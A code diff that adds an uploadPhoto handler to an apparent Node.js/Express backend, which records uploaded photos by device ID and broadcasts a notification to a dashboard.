@@ -407,6 +407,40 @@ function uploadScreenshot(req, res) {
   }
 }
 
+function uploadPhoto(req, res) {
+  try {
+    if (!req.file) {
+      return res.status(400).json({ error: "No photo file uploaded" });
+    }
+
+    const filename = req.file.filename;
+    const size = req.file.size;
+    console.log(`📸 Saved photo: ${filename} (${size} bytes)`);
+
+    let deviceId = req.body.deviceId || req.headers["x-device-id"];
+    if (!deviceId) {
+      const match = filename.match(/^photo_([a-z0-9_-]+)_/i);
+      deviceId = match ? match[1] : null;
+    }
+
+    const fileUrl = `/photos/${filename}`;
+
+    broadcastToDashboard({
+      type: "photo_saved",
+      deviceId: deviceId,
+      filename: filename,
+      url: fileUrl,
+      size: size,
+      ts: Date.now(),
+    });
+
+    res.json({ success: true, url: fileUrl });
+  } catch (e) {
+    console.error(`❌ Photo upload failed: ${e.message}`);
+    res.status(500).json({ error: e.message });
+  }
+}
+
 module.exports = {
   health,
   webrtcConfig,
@@ -422,4 +456,5 @@ module.exports = {
   sendCommand,
   listScreenshots,
   uploadScreenshot,
+  uploadPhoto,
 };
